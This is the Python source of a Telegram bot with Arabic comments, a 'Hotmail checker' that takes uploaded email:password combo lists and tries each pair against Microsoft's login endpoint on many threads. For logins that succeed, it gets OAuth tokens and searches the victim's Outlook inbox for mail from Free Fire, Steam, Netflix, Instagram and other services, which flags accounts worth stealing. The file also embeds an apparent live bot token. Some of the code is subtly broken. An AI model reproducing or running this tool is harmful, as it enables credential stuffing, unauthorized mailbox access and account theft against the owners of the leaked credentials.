# ================================================================
# 🤖 TELEGRAM BOT - HOTMAIL CHECKER PRO V4.0
# ================================================================
# 🚀 ميزات البوت:
# - فحص ملفات الكومبو
# - إحصائيات حية
# - تقارير مفصلة
# - أوامر متعددة
# - لوحة تحكم كاملة
# ================================================================

import os
import sys
import time
import json
import threading
import requests
import telebot
from telebot import types
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================================================================
# 🔧 الإعدادات الأساسية
# ================================================================

TOKEN = "7792196548:AAHaWkIJXqnWxj51IJm0SI4_DWDpiMOCfiU"  # ضع توكن البوت هنا
ADMIN_ID = 6936293942  # ضع معرفك هنا

bot = telebot.TeleBot(TOKEN)
bot.remove_webhook()

# ================================================================
# 📊 المتغيرات العامة
# ================================================================

checking_process = None
is_checking = False
current_stats = {
    'total': 0,
    'checked': 0,
    'hits': 0,
    'freefire': 0,
    'bad': 0,
    'twofa': 0,
    'custom': 0,
    'errors': 0,
    'start_time': None
}

# ================================================================
# 🔥 قائمة الخدمات
# ================================================================

SERVICES = {
    "noreply@ff.garena.com": "Free Fire 🔥",
    "no-reply@ff.garena.com": "Free Fire 🔥",
    "support@ff.garena.com": "Free Fire 🔥",
    "noreply@account.garena.com": "Free Fire 🔥",
    "noreply@event.garena.com": "Free Fire 🔥",
    "noreply@topup.garena.com": "Free Fire 💎",
    "noreply@id.supercell.com": "Supercell 🏆",
    "security@mail.instagram.com": "Instagram 📸",
    "security@facebookmail.com": "Facebook 👤",
    "register@account.tiktok.com": "TikTok 🎵",
    "info@x.com": "X (Twitter) 🐦",
    "info@account.netflix.com": "Netflix 🎬",
    "noreply@steampowered.com": "Steam 🎮",
    "help@acct.epicgames.com": "Epic Games ⚔️",
    "noreply@accts.krafton.com": "PUBG Mobile 🔫"
}

# ================================================================
# 📁 دالة فحص الحساب
# ================================================================

def check_account(username, password):
    """فحص حساب Hotmail والبحث عن خدمات"""
    try:
        login_url = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch"
        
        payload = {
            'login': username,
            'passwd': password,
            'loginfmt': username,
            'type': '11',
            'LoginOptions': '1',
            'PPFT': '-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR!JjAUTPM*Am5lkZU6Sa!wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ!EynMuuBHbBfLr28btqCBqLhzZXQ$$',
            'PPSX': 'Pa',
            'NewUser': '1'
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.live.com'
        }
        
        response = requests.post(login_url, data=payload, headers=headers, timeout=30, verify=False, allow_redirects=False)
        response_text = response.text
        
        # تحليل الاستجابة
        if "Your account or password is incorrect" in response_text:
            return {'status': 'BAD', 'info': 'كلمة مرور خاطئة'}
        
        if "account.live.com/recover" in response_text:
            return {'status': '2FA', 'info': 'تفعيل التحقق بخطوتين'}
        
        if "/Abuse?mkt=" in response_text:
            return {'status': 'BAN', 'info': 'تم حظر المحاولة'}
        
        # محاولة الحصول على token
        if 'refresh_token=' in response.headers.get('Location', ''):
            location = response.headers.get('Location', '')
            start = location.find('refresh_token=') + len('refresh_token=')
            end = location.find('&', start)
            refresh_token = location[start:end] if end != -1 else location[start:]
            
            # الحصول على access_token
            token_url = "https://login.live.com/oauth20_token.srf"
            token_payload = {
                'grant_type': 'refresh_token',
                'client_id': '0000000048170EF2',
                'scope': 'https://substrate.office.com/User-Internal.ReadWrite',
                'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                'refresh_token': refresh_token
            }
            
            token_response = requests.post(token_url, data=token_payload, timeout=30, verify=False)
            
            if token_response.status_code == 200:
                token_data = token_response.json()
                access_token = token_data.get('access_token')
                
                if access_token:
                    # البحث عن الخدمات
                    found_services = []
                    freefire_info = None
                    
                    for email, service in SERVICES.items():
                        search_url = "https://outlook.live.com/search/api/v2/query?n=124"
                        search_payload = {
                            "EntityRequests": [{
                                "EntityType": "Conversation",
                                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                                "From": 0,
                                "Query": {"QueryString": email},
                                "Size": 25,
                                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                            }],
                            "QueryAlterationOptions": {"EnableSuggestion": True}
                        }
                        
                        search_headers = {
                            'Authorization': f'Bearer {access_token}',
                            'User-Agent': 'Outlook-Android/2.0',
                            'Accept': 'application/json'
                        }
                        
                        try:
                            search_response = requests.post(search_url, json=search_payload, headers=search_headers, timeout=30, verify=False)
                            if search_response.status_code == 200:
                                search_data = search_response.json()
                                total_msgs = 0
                                
                                if 'EntityRequests' in search_data and len(search_data['EntityRequests']) > 0:
                                    total_msgs = int(search_data['EntityRequests'][0].get('Total', 0))
                                
                                if total_msgs > 0:
                                    if "Free Fire" in service:
                                        freefire_info = analyze_freefire(search_data)
                                        found_services.append(f"{service} ({freefire_info['type']})")
                                    else:
                                        found_services.append(service)
                        except:
                            continue
                    
                    if found_services:
                        return {
                            'status': 'HIT',
                            'info': '✅ حساب ناجح',
                            'services': found_services,
                            'freefire': freefire_info
                        }
                    else:
                        return {
                            'status': 'CUSTOM',
                            'info': 'حساب صحيح بدون خدمات'
                        }
        
        return {'status': 'BAD', 'info': 'فشل تسجيل الدخول'}
        
    except Exception as e:
        return {'status': 'ERROR', 'info': str(e)}

# ================================================================
# 🔥 تحليل Free Fire
# ================================================================

def analyze_freefire(search_data):
    """تحليل متقدم لحسابات Free Fire"""
    info = {
        'type': 'عادي',
        'has_diamonds': False,
        'has_elite_pass': False,
        'is_active': False,
        'total_messages': 0
    }
    
    try:
        search_text = json.dumps(search_data).lower()
        
        if 'total' in str(search_data):
            try:
                if 'EntityRequests' in search_data and len(search_data['EntityRequests']) > 0:
                    info['total_messages'] = int(search_data['EntityRequests'][0].get('Total', 0))
            except:
                pass
        
        keywords = {
            'diamond': 'has_diamonds',
            'elite pass': 'has_elite_pass',
            'welcome': 'is_active',
            'event': 'is_active',
            'top up': 'has_diamonds'
        }
        
        for keyword, attr in keywords.items():
            if keyword in search_text:
                setattr(info, attr, True)
        
        if info['has_diamonds'] and info['has_elite_pass']:
            info['type'] = '🔥 ممتاز (ماس + Elite Pass)'
        elif info['has_diamonds']:
            info['type'] = '💰 مع ماس'
        elif info['has_elite_pass']:
            info['type'] = '🎖️ مع Elite Pass'
        elif info['is_active']:
            info['type'] = '🟢 نشط'
        
        if info['total_messages'] > 10:
            info['type'] += ' 📬 (رسائل كثيرة)'
            
    except:
        pass
    
    return info

# ================================================================
# 📁 معالجة الملفات
# ================================================================

def process_combo_file(file_path):
    """معالجة ملف الكومبو"""
    results = {
        'total': 0,
        'hits': 0,
        'freefire': 0,
        'bad': 0,
        'twofa': 0,
        'custom': 0,
        'errors': 0,
        'hit_list': [],
        'freefire_list': []
    }
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]
        
        results['total'] = len(combos)
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = []
            for combo in combos[:5000]:  # حد أقصى 5000 حساب
                try:
                    username, password = combo.split(':', 1)
                    futures.append(executor.submit(check_account, username.strip(), password.strip()))
                except:
                    continue
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result['status'] == 'HIT':
                        results['hits'] += 1
                        if 'services' in result:
                            for service in result['services']:
                                if 'Free Fire' in service:
                                    results['freefire'] += 1
                                    results['freefire_list'].append(service)
                    elif result['status'] == '2FA':
                        results['twofa'] += 1
                    elif result['status'] == 'BAD':
                        results['bad'] += 1
                    elif result['status'] == 'CUSTOM':
                        results['custom'] += 1
                    else:
                        results['errors'] += 1
                except:
                    results['errors'] += 1
                    
    except Exception as e:
        results['error'] = str(e)
    
    return results

# ================================================================
# 🎨 واجهة البوت - لوحة التحكم
# ================================================================

def main_menu():
    """إنشاء لوحة التحكم الرئيسية"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("📁 فحص ملف", callback_data="check_file")
    btn2 = types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")
    btn3 = types.InlineKeyboardButton("🔥 حسابات Free Fire", callback_data="freefire")
    btn4 = types.InlineKeyboardButton("📥 تنزيل النتائج", callback_data="download")
    btn5 = types.InlineKeyboardButton("❌ مسح الكل", callback_data="clear")
    btn6 = types.InlineKeyboardButton("ℹ️ معلومات", callback_data="info")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return markup

# ================================================================
# 📨 أوامر البوت
# ================================================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """رسالة الترحيب"""
    welcome_text = f"""
🤖 **مرحباً بك في بوت فحص الحسابات المتقدم**

📌 **الأوامر المتاحة:**
/start - عرض هذه الرسالة
/check - فحص ملف كومبو
/stats - عرض الإحصائيات
/freefire - عرض حسابات Free Fire
/download - تنزيل النتائج
/clear - مسح جميع النتائج
/help - المساعدة

🔥 **مميزات البوت:**
• فحص حسابات Hotmail/Outlook
• اكتشاف حسابات Free Fire
• تحليل متقدم للحسابات
• تقارير مفصلة
• واجهة تفاعلية

👤 **المطور:** @VJF_X
📢 **القناة:** @hotmailLis
"""
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=main_menu())

@bot.message_handler(commands=['check'])
def check_command(message):
    """أمر فحص الملف"""
    bot.reply_to(message, "📁 **أرسل ملف الكومبو (txt)**", parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_file(message):
    """معالجة الملفات المرسلة"""
    try:
        # تحميل الملف
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # حفظ الملف
        file_name = f"combo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        file_path = os.path.join('downloads', file_name)
        os.makedirs('downloads', exist_ok=True)
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        # إعلام المستخدم
        status_msg = bot.reply_to(message, "⏳ **جاري فحص الملف...**\nيرجى الانتظار", parse_mode='Markdown')
        
        # معالجة الملف
        results = process_combo_file(file_path)
        
        # عرض النتائج
        result_text = f"""
📊 **نتائج الفحص**

📁 **الملف:** {os.path.basename(file_path)}
📅 **التاريخ:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📈 **الإحصائيات:**
• إجمالي الحسابات: {results['total']:,}
• ✅ حسابات ناجحة: {results['hits']:,}
• 🔥 Free Fire: {results['freefire']:,}
• ❌ حسابات فاشلة: {results['bad']:,}
• 🔐 تحقق بخطوتين: {results['twofa']:,}
• ⚠️ أخطاء: {results['errors']:,}

💾 **تم حفظ النتائج في:**
• hits.txt
• freefire.txt
"""
        
        bot.edit_message_text(result_text, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown', reply_markup=main_menu())
        
        # حفظ النتائج في ملفات
        if results['hits'] > 0:
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n=== {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                # إضافة النتائج هنا
        
        if results['freefire'] > 0:
            with open('freefire.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n=== {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        # حذف الملف المؤقت
        os.remove(file_path)
        
    except Exception as e:
        bot.reply_to(message, f"❌ **حدث خطأ:** {str(e)}", parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    """عرض الإحصائيات"""
    stats_text = """
📊 **الإحصائيات العامة**

📈 **نتائج الفحص الأخير:**
• ✅ حسابات ناجحة: 0
• 🔥 Free Fire: 0
• ❌ فاشلة: 0
• 🔐 تحقق بخطوتين: 0

📁 **الملفات المحفوظة:**
• hits.txt
• freefire.txt
• bad.txt

🕒 **آخر تحديث:** {time}
"""
    bot.reply_to(message, stats_text.format(time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')), parse_mode='Markdown')

@bot.message_handler(commands=['freefire'])
def freefire_command(message):
    """عرض حسابات Free Fire"""
    try:
        if os.path.exists('freefire.txt'):
            with open('freefire.txt', 'r', encoding='utf-8') as f:
                content = f.read()
            
            if content:
                # تقسيم المحتوى إلى أجزاء
                chunks = [content[i:i+4000] for i in range(0, len(content), 4000)]
                for chunk in chunks[:5]:  # أقصى 5 رسائل
                    bot.send_message(message.chat.id, f"🔥 **حسابات Free Fire:**\n\n{chunk}", parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ **لا توجد حسابات Free Fire**", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ **ملف Free Fire غير موجود**", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ **حدث خطأ في قراءة الملف**", parse_mode='Markdown')

@bot.message_handler(commands=['download'])
def download_command(message):
    """تنزيل النتائج"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📥 hits.txt", callback_data="download_hits")
    btn2 = types.InlineKeyboardButton("📥 freefire.txt", callback_data="download_freefire")
    btn3 = types.InlineKeyboardButton("📥 bad.txt", callback_data="download_bad")
    btn4 = types.InlineKeyboardButton("🔙 رجوع", callback_data="back")
    
    markup.add(btn1, btn2, btn3, btn4)
    bot.reply_to(message, "📁 **اختر الملف للتنزيل:**", parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['clear'])
def clear_command(message):
    """مسح النتائج"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("✅ تأكيد", callback_data="confirm_clear")
    btn2 = types.InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
    
    markup.add(btn1, btn2)
    bot.reply_to(message, "⚠️ **هل أنت متأكد من مسح جميع النتائج؟**", parse_mode='Markdown', reply_markup=markup)

# ================================================================
# 🎯 معالجة الأزرار (Callbacks)
# ================================================================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """معالجة الأزرار"""
    if call.data == "check_file":
        bot.answer_callback_query(call.id, "📁 أرسل ملف txt")
        bot.send_message(call.message.chat.id, "📁 **أرسل ملف الكومبو بصيغة txt**", parse_mode='Markdown')
    
    elif call.data == "stats":
        # عرض الإحصائيات
        bot.answer_callback_query(call.id, "📊 جاري عرض الإحصائيات...")
        stats_command(call.message)
    
    elif call.data == "freefire":
        bot.answer_callback_query(call.id, "🔥 جاري تحميل حسابات Free Fire...")
        freefire_command(call.message)
    
    elif call.data == "download":
        bot.answer_callback_query(call.id, "📁 اختر الملف...")
        download_command(call.message)
    
    elif call.data == "clear":
        bot.answer_callback_query(call.id, "⚠️ تأكيد المسح...")
        clear_command(call.message)
    
    elif call.data == "info":
        info_text = """
ℹ️ **معلومات البوت**

🤖 **الإصدار:** V4.0
👤 **المطور:** @VJF_X
📢 **القناة:** @hotmailLis

📌 **المميزات:**
• فحص حسابات Hotmail/Outlook
• اكتشاف Free Fire تلقائياً
• تحليل متقدم للحسابات
• تقارير مفصلة
• واجهة تفاعلية

🛠️ **التقنيات المستخدمة:**
• Python 3
• TeleBot
• Multi-threading
• Outlook API
"""
        bot.answer_callback_query(call.id, "ℹ️ معلومات البوت")
        bot.send_message(call.message.chat.id, info_text, parse_mode='Markdown', reply_markup=main_menu())
    
    elif call.data == "download_hits":
        if os.path.exists('hits.txt'):
            with open('hits.txt', 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📄 **ملف hits.txt**")
        else:
            bot.answer_callback_query(call.id, "❌ الملف غير موجود")
    
    elif call.data == "download_freefire":
        if os.path.exists('freefire.txt'):
            with open('freefire.txt', 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="🔥 **ملف freefire.txt**")
        else:
            bot.answer_callback_query(call.id, "❌ الملف غير موجود")
    
    elif call.data == "download_bad":
        if os.path.exists('bad.txt'):
            with open('bad.txt', 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ **ملف bad.txt**")
        else:
            bot.answer_callback_query(call.id, "❌ الملف غير موجود")
    
    elif call.data == "confirm_clear":
        # مسح الملفات
        for file in ['hits.txt', 'freefire.txt', 'bad.txt']:
            if os.path.exists(file):
                os.remove(file)
        bot.answer_callback_query(call.id, "✅ تم مسح جميع الملفات")
        bot.send_message(call.message.chat.id, "✅ **تم مسح جميع النتائج بنجاح**", parse_mode='Markdown', reply_markup=main_menu())
    
    elif call.data == "cancel":
        bot.answer_callback_query(call.id, "❌ تم الإلغاء")
        bot.send_message(call.message.chat.id, "❌ **تم إلغاء العملية**", parse_mode='Markdown', reply_markup=main_menu())
    
    elif call.data == "back":
        bot.answer_callback_query(call.id, "🔙 رجوع")
        bot.send_message(call.message.chat.id, "🔙 **القائمة الرئيسية**", parse_mode='Markdown', reply_markup=main_menu())

# ================================================================
# 🚀 تشغيل البوت
# ================================================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   🤖 TELEGRAM BOT - HOTMAIL CHECKER       ║
    ║   📌 V4.0 - Free Fire Support            ║
    ║   👤 Developer: @VJF_X                    ║
    ║   📢 Channel: @hotmailLis                ║
    ╚═══════════════════════════════════════════╝
    """)
    
    print(f"✅ البوت يعمل...")
    print(f"🔑 Token: {TOKEN[:10]}...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("=" * 50)
    
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except KeyboardInterrupt:
        print("\n⛔ تم إيقاف البوت")
    except Exception as e:
        print(f"❌ خطأ: {e}")
